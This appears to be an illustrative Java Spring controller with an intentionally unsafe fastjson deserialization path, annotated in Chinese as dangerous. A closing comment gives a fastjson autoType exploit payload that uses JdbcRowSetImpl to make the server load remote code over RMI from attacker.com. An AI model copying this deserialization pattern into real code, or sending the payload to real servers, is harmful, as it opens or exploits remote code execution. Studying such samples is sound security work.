package com.example.bigdata.config;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.web.bind.annotation.*;

import javax.annotation.PostConstruct;
import javax.servlet.http.HttpServletRequest;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/admin/config")
public class AuthProviderController {
    
    private final RedisTemplate<String, Object> redisTemplate;
    private final AuthService authService;
    
    public AuthProviderController(RedisTemplate<String, Object> redisTemplate, AuthService authService) {
        this.redisTemplate = redisTemplate;
        this.authService = authService;
    }
    
    @PostMapping("/{type}")
    public String updateConfig(@PathVariable String type, @RequestBody String body) {
        AuthProviderConfig config = JsonUtils.jsonToObject(body, AuthProviderConfig.class);
        authService.validateAndSave(config);
        return "Config updated";
    }
    
    static class JsonUtils {
        static <T> T jsonToObject(String json, Class<T> clazz) {
            // 不安全的反序列化实现
            return JSON.parseObject(json, clazz);
        }
    }
    
    static class AuthProviderConfig implements Serializable {
        private String name;
        private Map<String, Object> properties = new HashMap<>();
        // getter/setter
    }
    
    static class AuthService {
        private final RedisTemplate<String, Object> redisTemplate;
        
        AuthService(RedisTemplate<String, Object> redisTemplate) {
            this.redisTemplate = redisTemplate;
        }
        
        void validateAndSave(AuthProviderConfig config) {
            // 模拟业务验证
            if (config.getName() == null) throw new IllegalArgumentException();
            
            // 危险的Redis存储操作
            redisTemplate.opsForValue().set(
                "auth:" + config.getName(),
                processProperties(config.getProperties())
            );
        }
        
        private Map<String, Object> processProperties(Map<String, Object> props) {
            // 二次反序列化风险扩散
            Map<String, Object> result = new HashMap<>();
            props.forEach((k, v) -> {
                if (v instanceof String) {
                    result.put(k, JSON.parseObject((String) v));
                } else {
                    result.put(k, v);
                }
            });
            return result;
        }
    }
}

// 攻击载荷示例：
// {
//   "@type": "com.sun.rowset.JdbcRowSetImpl",
//   "dataSourceName": "rmi://attacker.com:1099/Exploit",
//   "autoCommit": true
// }